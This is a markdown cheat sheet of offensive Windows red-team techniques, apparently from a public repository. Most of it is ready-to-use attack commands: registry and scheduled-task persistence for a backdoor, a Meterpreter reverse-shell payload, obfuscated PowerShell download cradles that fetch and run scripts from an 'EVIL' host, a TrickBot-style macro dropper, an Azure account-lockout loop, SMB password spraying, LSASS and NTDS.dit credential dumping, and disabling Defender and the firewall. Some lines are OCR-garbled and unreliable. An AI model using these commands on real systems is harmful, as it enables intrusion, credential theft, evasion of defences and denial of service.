# Windows TTPs

## PowerShell Tricks

## Windows System Enumeration

```powershell
ver
time
net session
psloglist "Security" -i 528 -s | find /i "Logon Type: 10"
net statistics
nltest /dclist
net group /domain "Domain Admins"
date
tzutil /g
tracert 8.8.8.8
hostname
ipconfig
arp -a
route print
sc query state=all
tasklist /svc
tasklist /m
tasklist /S ip /v
taskkill /PID pid /F
systeminfo /S ip /U domain\user /P Pwd
dir /a /s /b c:\'.pdf'
dir /a /b c:\windows\kb'
findstr /si password' .txt I •.xmll •.xls tree /F /A c:\ tree.txt
reg save HKLM\Security security.hive echo %USERNAME%
```

## Windows Persistence

```plaintext
1. REG add HKEY CURRENT USER\Software\l1icrosoft\W indows\CurrentV ersion\Run /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
2. at 19:00 /every:t1,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
3. SCHTASKS /Create /RU "SYSTEt1" /SC l1INUTE /t10 45 /TN FIREWALL /TR
"%USERPROFILE%\backdoor.exe" /ED 12/12/2012
```

## Start RDP

```powershell
reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
(Tunnel RDP through port 443) REG ADD "HKLM\System\CurrentControlSet\Control\Terminal
Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
```

## PowerShell Enumeration

```powershell
Get-WmiObject -class win32 operatingsjstem I select -property 1 csv c:\os.txt
Get-Service I where object {$ .status -eq ''Running''}
(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential( 11 title ", 11 message 11 1 11 user" 11 domain")
powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject "Subject11 -a " attachment file path " -body "Body" -SmtpServer Target Email Server IP
```

## PowerShell Launching Meterpreter Payload

1. msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.ps1
2. Move audit.ps1 into same folder as encodeMeterpreter.ps1
3. Launch Powershell (x86)
4. powershell.exe -executionpolicy bypass encodeMeterpreter.ps1
5. Copy the encoded Meterpreter string

## Windows User Lockout

```batch
@echo T est run:
for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN- 1234\c$ /USER:%%U wrongpass
```

## Windows DHCP Exhaustion

```powershell
for /L %i in (2,1,254) do (netsh interface ip set address local static
1.1.1.%i netrnask gw I~ %1 ping 12-.0.0.1 -n l -w 10000 nul %1)
```

## Rolling Reboot

```powershell
for /L %i in (2,1,254) do shutdown /r /m \\l.l.l.%i /f /t 0 /c "Reboot
message''
```

## PowerShell Azure DoS

```powershell
function Invoke-BruteForceDoS
{
    Param(
            [Parameter(Mandatory=$True)]
            [string]$User
        )
    while($true)
    {
        $randomGuid = New-Guid
        $body = @{
            "resource"   = $randomGuid
            "client_id"  = $randomGuid
            "grant_type" ="password"
            "username"   = $User
            "password"   = $randomGuid
            "scope"      = "openid"
        }

        try
        {
            $response=Invoke-RestMethod -UseBasicParsing -Uri "https://login.microsoftonline.com/common/oauth2/token" -ContentType "application/x-www-form-urlencoded" -Method POST -Body $body
        }
        catch
        {
            $stream = $_.Exception.Response.GetResponseStream()
            $responseBytes = New-Object byte[] $stream.Length

            $stream.Position = 0
            $stream.Read($responseBytes,0,$stream.Length) | Out-Null
            
            $errorDetails = [text.encoding]::UTF8.GetString($responseBytes) | ConvertFrom-Json | Select -ExpandProperty error_description

            $datacenter = "{0,-6}" -f ($_.Exception.Response.Headers["x-ms-ests-server"].Split(" ")[2])
        }
            
        # Parse the error code.
        if(!$exists -and $errorDetails)
        {
            if($errorDetails.startsWith("AADSTS50053")) # The account is locked, you've tried to sign in too many times with an incorrect user ID or password.
            {
                Write-Host "$($datacenter): [ LOCKED ] $user" -ForegroundColor Red
            }
            elseif($errorDetails.StartsWith("AADSTS50126")) # Error validating credentials due to invalid username or password.
            {
                Write-Host "$($datacenter): [WRONGPWD] $user" -ForegroundColor Gray
            }
            elseif($errorDetails.StartsWith("AADSTS50034")) # The user account {identifier} does not exist in the {tenant} directory. To sign into this application, the account must be added to the directory.
            {
                Write-Host "$($datacenter): [NOTFOUND] $user" 
            }
        }
    }
}
```

## PowerShell Port Scanning

Powershell Test-NetConnection, ```tnc``` for short, host and port scanning:

```
PS L:\> tnc 8.8.8.8

ComputerName           : 8.8.8.8

RemoteAddress          : 8.8.8.8

InterfaceAlias         : Ethernet 2

SourceAddress          : 192.168.122.201

PingSucceeded          : True

PingReplyDetails (RTT) : 15 ms
```

Traceroute:

```
PS L:\> tnc 8.8.8.8 -traceroute

ComputerName           : 8.8.8.8

RemoteAddress          : 8.8.8.8

InterfaceAlias         : Ethernet 2

SourceAddress          : 192.168.122.201

PingSucceeded          : True

PingReplyDetails (RTT) : 13 ms

TraceRoute             : 192.168.122.1

                         99.254.226.1

                         66.185.90.177

                         24.156.147.129

                         209.148.235.222

                         72.14.216.54

                         108.170.228.0

                         172.253.69.113

                         8.8.8.8
```

Port Scanning:

```
PS L:\> tnc 8.8.8.8 -port 443

ComputerName     : 8.8.8.8

RemoteAddress    : 8.8.8.8

RemotePort       : 443

InterfaceAlias   : Ethernet 2

SourceAddress    : 192.168.122.201

TcpTestSucceeded : True
```

## PowerShell Change Timestamp of Directory

```PS> (Get-Item "C:\Windows\system32\MyDir").CreationTime=("01 March 2019 19:00:00")```

## PowerShell Changing Modification Time of a File

```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt").LastWriteTime=("01 March 2019 19:00:00")```

## PowerShell Changing Access Time of a File

```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt ").LastAccessTime=("01 March 2019 19:00:00")```

## PowerShell Disabling Firewall

```
PS> powershell.exe -command "netsh advfirewall set allprofiles state off"
```
## Enumerating Domain Controllers with PowerShell

```
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers 
```

## Enumerating Domain Users with PowerShell


Save all Domain Users to a file

```
Get‐DomainUser | Out‐File ‐FilePath .\DomainUsers.txt
```

Will return specific properties of a specific user

```
Get‐DomainUser ‐Identity [username] ‐Properties DisplayName, MemberOf |
Format‐List
```

Enumerate user logged on a machine

```
Get‐NetLoggedon ‐ComputerName <ComputerName>
```

Enumerate Session Information for a machine

```
Get‐NetSession ‐ComputerName <ComputerName>
```

Enumerate domain machines of the current/specified domain where specific
users are logged in

```
Find‐DomainUserLocation ‐Domain <DomainName> | Select‐Object UserName,
SessionFromName
```

## Sneaky PowerShell Commands

```powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file] '))"```

```powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetw orkCredentials;iwr('http://webserver/payload.ps1')|iex"```

PowerShell Downgrade Attack

```
PowerShell –Version 2 –Command <…>
```

Detecting PowerShell Downgrade Attacks

```
Get-WinEvent -LogName "Windows PowerShell" |
    Where-Object Id -eq 400 |
    Foreach-Object {
        $version = [Version] (
            $_.Message -replace '(?s).*EngineVersion=([\d\.]+)*.*','$1')
        if($version -lt ([Version] "5.0")) { $_ }
}
```

Disabling PowerShell Version 2

```
# Query the current status of PowerShell 2.0 components:
Get-WindowsOptionalFeature -Online -FeatureName "*PowerShellV2*"

# Disable PowerShell 2.0:
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

PowerShell Data Compression for Exfiltration

```
PS > Compress-Archive -Path <files to zip> -CompressionLevel
Optimal -DestinationPath <output path>
```

PowerShell File Hashing for Blue Teamers

```
Get-ChildItem -Path D:\Potentially_Malicious\Folder\ | Get-FileHash | Export-Csv -Path D:\PowerShell\FilesHashes_For_VirusTotal.csv -NoTypeInformation
```

## TrickBot PowerShell Download TTP

1. Insert base64 string for malicious web server
2. Select filename for output in %tmp% directory
3. Attach to Office macro

```
cmd.exe /c powershell "'powershell ""$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''... Base64 string ...''));
IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
'""| out-file -filepath %tmp%\tmp9388.bat -encoding ascii; cmd /c '%tmp%\tmp9388.bat'
```

## Enable PowerShell Remoting

Tip Provided By Joshua Wright:

By default, Windows Server 2012R2 and later have PowerShell remote access turned on by default. Windows 10 and Windows 11 systems have this feature turned off by default. To turn on PowerShell remote access, an administrator can run the ```Enable-PSRemoting``` command:

```
PS C:\WINDOWS\system32> Enable-PSRemoting
```

With the appropriate permissions, remote access to PowerShell is straightforward: run Enter-PSSession and specify the target host name or IP address using -ComputerName:

```
PS C:\WINDOWS\system32> Enter-PSSession -ComputerName VICTIM
[VICTIM]: PS C:\Users\Victim\Documents>
```

When you are done with your PowerShell remote session, run ```Exit-PSSession``` to return to your host system.

## PowerShell Password Manager and Clipboard Access

Password managers offer many benefits for selection and storage of passwords.

```
PS C:\> $x=""; while($true) { $y=get-clipboard -raw; if ($x -ne $y) { Write-Host $y; $x=$y} }
```

## PowerShell List Named Pipes

```
ls \\.\pipe\
```

To run using ```cmd.exe```:

```
dir \\.\pipe\\
```

## Python LM Hash Generation

```
python -c 'from passlib.hash import lmhash;print lmhash.hash("password")'
```

## Discovering WiFi Passwords

```
netsh wlan show profiles
```

```
netsh wlan show profile name="SSID" key=clear
```
## Potential Credential Files

```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

## Find GPP Passwords in SYSVOL

```
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
```

## Searching the Registry for Passwords

```
reg query HKLM /f password  /t REG_SZ  /s 
```
## Local Domain Recon

Shows the domain:

```
echo %USERDOMAIN%
```

Maps AD trust relationships:

```
nltest /domain_trusts 
```

Prints the domain controller name:

```
echo %logonserver% 
```

## Searching the File System for Files of Interest

```
dir /s *pass* == *cred* == *vnc* == *.config*
```

Search certain file types for a keyword, this can generate a lot of output.

```
findstr /si password *.xml *.ini *.txt
```

# Living off the Land

## Cscript/Wscript

```cscript //E:jscript \\webdavserver\folder\payload.txt```

## MSHTA

```mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload .sct"")"))```
```mshta \\webdavserver\folder\payload.hta```

## WMIC

```wmic os get /format:"https://webserver/payload.xsl"```

## Examining Processes with WMIC

```
wmic process list full
wmic process list brief
wmic process get name, parentprocessid,processid
wmic process where processid=pid get commandline
```
## WMI Recon

```
wmic process get CSName,Description,ExecutablePath,ProcessId
wmic useraccount list full
wmic group list full
wmic netuse list full
wmic qfe get Caption,Description,HotFixID,InstralledOn
wmic startup get Caption,Command,Location,User
```

## Examining Network Usage

```
netstat -na
netstat -naob
netstat -naob 5
netsh advfirewall show currentprofile
```

## Examining Services

```
services.msc
net start
sc query | more
tasklist /svc
```

## Examining the Registry

```
regedit
reg query <regkey>

# Potential Autostart Entry Points to Enumerate

HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOncEx

# NOTE: Inspect both HKCU and HKLM
```

Disabling Windows Defender in the Registry:

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```
## Examining Unusual Accounts

```
lusrmgr.msc
net user
net localgroup <group>
```

## Examining Unusual Scheduled Tasks

```
schtasks
```

## Examining Unusual Log Entries

```
wevutil qe security /f:text
Get-EventLog -LogName Security | Format-List -Property *
```

## Lua UAC Bypass

```
-- auto elevate UAC bypass only on Windows 10.
is.popen("c:\windows\system32\cmd.exe /c 'mkdir %appdata%\..\Local\Microsoft\WindowsApps'")
is.popen("c:\windows\system32\cmd.exe /c 'copy Tsutsuji_x64.dll %appdata%\..\Local\Microsoft\WindowsApps\BluetoothDiagnosticUtil.dll'")
is.popen("c:\windows\system32\cmd.exe /c 'c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes'")
```

## TCPDump

```
tcpdump -i <interface> # Capture, can use "any" 
tcpdump -i <interface> -w <file> # Write to a file after capture
tcpdump -r <file> -n # Read from a file and don't resolve hosts and ports
tcpdump -r <file> -n -A # Read from a file and don't resolve hosts and ports, show as ASCII

# Berkeley Packet Filtering

tcpdump -r <file> 'host 8.8.8.8'
tcpdump -r <file> 'src host 8.8.8.8'
tcpdump -r <file> 'not src host 8.8.8.8'
tcpdump -r <file> 'icmp and (src host 8.8.8.8'
```
## PSExec'ing

Running PsExec by uploading malicious executable:

```
# This will continue the PsExec session through named pipe, and will only terminate once the process is terminated. Additionally this -c parameter will manually cleanup the executable.
PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -c update.exe

# This will kill the PsExec session and leave the malicious executable on disk
PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -d update.exe
```

## Windows Domain Controller Hash Harvesting

GOAL: Obtain ```NTDS.dit``` and SYSTEM registry hive data

```
C:\Users\RoseSecurity> ntdsutil
ntdsutil: activate instance ntds
ntdsutil: ifm
ifm: create full c:\ntds

Copying registry files...
Copying c:\ntds\registry\SYSTEM
Copying c:\ntds\registry\SECURITY
IFM media created successfully in c:\ntds
ifm: quit
ntdsutil: quit
```

## Payload Download Cradles: (https://github.com/VirtualAlllocEx)

This are different types of download cradles which should be an inspiration to play and create new download cradles to bypass AV/EPP/EDR in context of download cradle detections. Notice, removing or obfuscating signatures from your download cradle is only one piece of the puzzle to bypass an AV/EPP/EDR. Depending on the respective product you have to modify your payload which should be downloaded by the cradle to bypass API-Hooking, Callbacks, AMSI etc.

```
# not proxy aware cmd download cradles 

# default download cradle 
c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")"
PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/evil.ps1\")"

# obfuscated v1
CMD> c:\wiNdoWs\sysTEM32\CmD  /c  pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/evil.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
CMD> pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/evil.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"

# proxy aware cmd download cradles

# default download cradle
c:\wInDOwS\sysTem32\CmD   /cPowErShell -wINdowstYL  Hi  -nop -eXecU ByPAss -COm    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring(\"https://cutt.ly/syFzILs\")"
PowErShell -wINdowstYL  Hi  -nop -eXecU ByPAss -COm    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring(\"https://cutt.ly/syFzILs\")"

# obfuscated v1
C:\WINdOWS\SySteM32\CmD.EXe  /cpOWershEll  -eXecut byPaSS -Noprof  -w  H -Co    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`e`x $c.downloadstring(\"ht\"+\"tps://cutt.ly/syFzILs\")"
poWershELl -execUT byPAss -WINDo  1  -nopR  -comm  "& ((vARiaBlE '*mdr*').Name[3,11,2]-JoiN'') ((('{2}c=new-obj'+'ect ne'+'t.'+'webclient;{2'+'}'+'c.p'+'roxy='+'[Net'+'.'+'WebR'+'equest]::'+'GetS'+'yst'+'emWebP'+'ro'+'x'+'y();{'+'2}c'+'.Pr'+'oxy.Cre'+'dentials=[Net'+'.Cr'+'edentialC'+'ache]::D'+'e'+'fau'+'l'+'tCredenti'+'als'+';{0}i{0}e'+'{0}x {'+'2}c.downl'+'oa'+'ds'+'t'+'ring({1}ht{1}+{1'+'}t'+'ps'+':'+'/'+'/'+'cutt.ly/syFzIL'+'s{1})') -F  [cHAR]96,[cHAR]34,[cHAR]36))"
```

## AppInstaller Download Cradle

Tool used for installation of AppX/MSIX applications on Windows 10. AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>

```
start ms-appinstaller://?source=https://raw.githubusercontent.com/RoseSecurity/Red-Teaming-TTPs/main/Windows.md
```

# Living Off the Land: Windows Packet Capturing

Packet Monitor (Pktmon) is an in-box, cross-component network diagnostics tool for Windows. It can be used for packet capture, packet drop detection, packet filtering and counting.

```
C:\Users\SecurityNik>pktmon filter add IP-TCP-SYN-443 --data-link IPv4 --ip-address 172.217.2.115 --transport-protocol tcp SYN --port 443
Filter added.

C:\Users\SecurityNik>pktmon filters list
 # Name           EtherType Protocol  IP Address    Port
 - ----           --------- --------  ----------    ----
 1 IP-TCP-SYN-443 IPv4      TCP (SYN) 172.217.2.115  443

C:\Users\RoseSecurity>pktmon start  --etw --log-mode real-time --packet-size 1500
Active measurement started.
Processing...

23:02:26.539704700 PktGroupId 562949953421500, PktNumber 1, Appearance 1, Direction Tx , Type Ethernet , Component 78, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
23:02:26.539709400 PktGroupId 562949953421500, PktNumber 1, Appearance 2, Direction Tx , Type Ethernet , Component 31, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
23:02:26.539712200 PktGroupId 562949953421500, PktNumber 1, Appearance 3, Direction Tx , Type Ethernet , Component 32, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
23:02:26.539714000 PktGroupId 562949953421500, PktNumber 1, Appearance 4, Direction Tx , Type Ethernet , Component 33, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        40-EC-99-B9-17-25 > F0-B4-D2-5A-D3-E2, ethertype IPv4 (0x0800), length 66: 192.168.0.62.65066 > 172.217.2.115.443: Flags [S], seq 1995496356, win 64240, options [mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
23:02:26.599504500 PktGroupId 1688849860264106, PktNumber 1, Appearance 1, Direction Rx , Type Ethernet , Component 33, Edge 1, Filter 1, OriginalSize 66, LoggedSize 66
        F0-B4-D2-5A-D3-E2 > 40-EC-99-B9-17-25, ethertype IPv4 (0x0800), length 66: 172.217.2.115.443 > 192.168.0.62.65066: Flags [S.], seq 546326696, ack 1995496357, win 60720, options [mss 1380,nop,nop,sackOK,nop,wscale 8], length 0
23:02:26.599510100 PktGroupId 1688849860264106, PktNumber 1, Appearance 2, Direction Rx , Type Ethernet , Component 32, 
... <TRUNCATED FOR BREVITY>....
```

Converting to PCAPNG

```
C:\Users\RoseSecurity>pktmon pcapng PktMon1.etl --out RoseSecurity-pktmon.pcapng
Processing...

Packets total:     60
Packet drop count: 0
Packets formatted: 60
Formatted file:    RoseSecurity-pktmon.pcapng
```
## SMB Password Guessing

Create list of domain users

```
C:\> net user /domain > users.txt
```

Create password list 

```
C:\> notepad pass.txt
```

Start spraying!

```
C:\> @FOR /F %p in (pass.txt) DO @FOR /F %n in (users.txt) DO @net use \\SERVERIP\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
```

## SMB Lateral Movement

Check if SMB signing is disabled on the endpoint:

```
nmap -p 445 <Victim IP> -sS --script smb-security-mode
```

Force authentication by crafting a HTML or file of your choice:

```
<html>
    <h1>The Dietary Benefits of Eating Ben and Jerry's Phish Food</h1>
    <img src="file://<Compromised Host>/download.jpg">
</html>
```

Fire up SMBRelayx tool that will listen for incoming SMB authentication requests and will relay them to the victim and will attempt to execute the command, ipconfig, on the end host:

```
smbrelayx.py -h <Victim IP> -c "ipconfig"
```

## Active Directory DNS Enumeration

The tool ```adidnsdump``` enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks.

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

adidnsdump -u domain_name\\username ldap://10.10.10.10 -r
cat records.csv
```

## PSexec with NMAP

```
nmap --script smb-psexec.nse -script-args=smbuser=<username>, smbpass=<password>[,config=<config>] -p445 <hosts>
```

## AV LSASS Dump

How to utilize Avast AV to dump LSASS (C:\Program Files\Avast Software\Avast)

```
AvDump.exe --pid 1111 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
```

## Certutil Download Cradle

Download and save a Python file to an Alternate Data Stream (ADS).

```
certutil.exe -urlcache -split -f https://github.com/RoseSecurity/APOLOGEE/blob/main/siemens_field_panel_scanner.py c:\temp:apologee.py
```

## Kerberoasting with Impacket

ASREPRoast

With Impacket example GetNPUsers.py:

```
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```
## Dumping LSASS With Visual Studio

Dump64: Memory dump tool that comes with Microsoft Visual Studio

Path: C:\Program Files (x86)\Microsoft Visual Studio\Installer\Feedback\dump64.exe

Enumerate for Visual Studio install:

```
C:\> code -v
```

Find LSASS PID:

```
tasklist /fi "Imagename eq lsass.exe"
```

Uuse Dump64 to dump LSASS:

```
C:\> dump64.exe <pid> out.dmp
```

## Dumping LSASS Without Mimikatz

To get LSASS process ID via CMD:

```
PS C:\Users\test> tasklist | findstr lsass
lsass.exe                      580 Services                   0     51,752 K
```

Depending on the EDR, it may be sufficient to simply add quotations around the process name (This bypasses Cortex XDR for example):

```
procdump.exe -accepteula -ma “lsass.exe” out.dmp
```

## Dumping LSASS With NetExec

Using Lsassy and Nanodump:
```
nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
```

```
nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
```

## Stealing Signatures with SigThief

Download: https://github.com/secretsquirrel/SigThief

Rips a signature off a signed PE file and appends it to another one, fixing up the certificate table to sign the file.

```
$ ./sigthief.py -i procmon.exe -t x86_meterpreter_stager.exe -o /tmp/definitely_legit.exe 

Output file: /tmp/definitely_legit.exe 
Signature appended. 
FIN.
```
## CertOC Downloads

Downloads text formatted files

```
certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
```
## Shodan for SMB

SMB ( Server Message Block ) authentication without credentials, also known as anonymous SMB access, allows users to access shared resources on a network without providing username or passwords. This can be useful for accessing shared folders that have been configured to allow anonymous access.

```
"Authentication: disabled" port:445 product:"Samba" 
```

```
smbclient -L //200.x.x.29/ -N  
smbclient //200.x.x.29/info
```

## Plundering Account Information with RPCClient and SMBClient

Once you have a user name and password and open SMB access of a target Windows client or server over TCP port 445, you can use rpcclient to open an authenticated SMB session to a target machine by running the following command on your Linux system:

```
$ rpcclient —U <username> <winipaddr>

# If the server allows NULL sessions, the following command could be utilized
$ $ rpcclient —U "" <winipaddr>
```

General enumeration:

```
rpcclient $> srvinfo
```

Domain users:

```
rpcclient $> enumdomusers
```

Domain groups:

```
rpcclient $> enumdomgroups

```
Scanning individual users:

```
rpcclient $> queryuser 500
```

Create a domain user:

```
rpcclient $> createdomuser hacker
rpcclient $> setuserinfo2 hacker 24 Password@1
rpcclient $> enumdomusers
```

Use smbclient to enumerate a list of file shares:

```
$ smbclient -L ip -U username

# Check for NULL sessions
$ smbclient -N -L ip
```

Evaluate what the minimum SMB version is for the server:

```
$ smbclient -L ip -U username -m NT1
$ smbclient -L ip -U username -m SMB2
$ smbclient -L ip -U username -m SMB3
```

## Registry Keys for Recent Documents

Recent documents opened by users:

```
NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs: Recent documents opened by the user
```

Recent Office documents:

```
NTUSER.DAT\Software\Microsoft\Office{Version}{Excel|Word}\FileMRU
```
Versions:

- 14.0 Office 2010
- 12.0 Office 2007
- 11.0 Office 2003
- 10.0 Office X

Recent office documents:

```
NTUSER.DAT\Software\Microsoft\Office{Version}{Excel|Word} UserMRU\LiveID_###\FileMRU
```

## Command Prompt from MSPaint

If you find yourself on a locked down system and aren’t able to open a command prompt but do have access to Microsoft’s Paint program then this might be the hack for you; courtesy of Simon.

1. Load mspaint, it should start with a blank canvas
2. Use the resize menu option to change the drawing to 6 pixels wide by 1 pixel high.
3. Select the pencil drawing tool.
4. Use the Edit Colours option to create custom colours using the following RGB values:

```
Pixel 1 = R(10), G(0), B(0)
Pixel 2 = R(13), G(10), B(13)
Pixel 3 = R(100), G(109), B(99)
Pixel 4 = R(120), G(101), B(46)
Pixel 5 = R(0), G(0), B(101)
Pixel 6 = R(0), G(0), B(0)
```
5. For each color you create, paint 1 pixel working from left to right.
6. The final image should look something like this:

![pixels](https://user-images.githubusercontent.com/72598486/217630466-ef0dec9a-17a3-411f-9067-fa4914684b79.jpg)

7. Now save the picture using the ```File | Save``` as option and choose 24-bit Bitmap as the type.  I saved it as command.bmp
8. Make a copy of the file and rename it to command.bat.
9. Double click the file to run the batch file and you will open a command prompt!

## BITS Jobs and Downloads

Windows includes the Background Intelligent Transfer Service (BITS), which facilitates file transfers via HTTP and SMB. `bitsadmin` and PowerShell cmdlets are available to manage these transfers, but they can be abused to download and execute malicious payloads on a compromised host, requiring Administrator privileges.

Starting with creating a job named “winupdatejob”, then we add the payload file in the job that we just created.

```
bitsadmin /addfile winupdatejob http://192.168.1.13/payload.exe C:\payload.exe
```

After adding the file, we use the /SetNotifyCmdLine switch to execute the payload. This is done with the help of an action that we scripted. First, it will start the cmd.exe and then, it will complete the download and then it will execute the said command in the background.

```
bitsadmin /SetNotifyCmdLine winupdatejob cmd.exe "/c bitsadmin.exe /complete winupdatejob | start /B C:\payload.exe"
```

After this, we run the /resume switch to get the download started.

```
bitsadmin /resume winupdatejob
```

## PSexec from WebDAV

```
\\live.sysinternals.com\tools\PSExec64.exe -accepteula
```

## CrackMapExec Tips and Tricks

Null session:

```
crackmapexec smb 192.168.2.24 -u "" up ""
```

Connect to target using local account:

```
crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth
```

Dump local SAM hashes:

```
crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth --sam
```

#### Enumerate Everything

> [!NOTE]
> Some enumeration methods may fail depending on the privilege level of the user you're authenticating as

Password authentication:

```
crackmapexec smb CIDR/IP -d targetdomain.tld -u username -p 'password' \
--shares \
--sessions \
--disks \
--loggedon-users \
--users \
--groups \
--computers \
--local-groups \
--pass-pol
```

Pass the hash:

```
crackmapexec smb CIDR/IP -d targetdomain.tld -u username -H lm-hash:nt-hash \
--shares \
--sessions \
--disks \
--loggedon-users \
--users \
--groups \
--computers \
--local-groups \
--pass-pol
```

#### Dump Files

Using the option `-o READ_ONLY=false` all files will be copied on the host

```
crackmapexec smb targets.txt -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false
```

## NetExec

ZeroLogon:

```
nxc smb <ip> -u '' -p '' -M zerologon
```

PetitPotam:

```
nxc smb <ip> -u '' -p '' -M petitpotam
```

noPAC:

```
nxc smb <ip> -u 'user' -p 'pass' -M nopac
```

Map Network Hosts:

```
nxc smb 192.168.1.0/24
```

Checking if Null Session is enabled on the network, can be very useful on a Domain Controller to enumerate users, groups, password policy etc:

```
nxc smb 10.10.10.161 -u '' -p ''
nxc smb 10.10.10.161 --pass-pol
nxc smb 10.10.10.161 --users
nxc smb 10.10.10.161 --groups
```

WMI Spray:

```
nxc wmi 10.10.10.0/24 -u userfile -p passwordfile
```

## Disabling Prefetch

What are Prefetch Files? Prefetch files are great artifacts for forensic investigators trying to analyze applications that have been run on a system. Windows creates a prefetch file when an application is run from a particular location for the very first time. This is used to help speed up the loading of applications. But if we disable Prefetch files, we can hide execution patterns of our malware to hinder incident response.

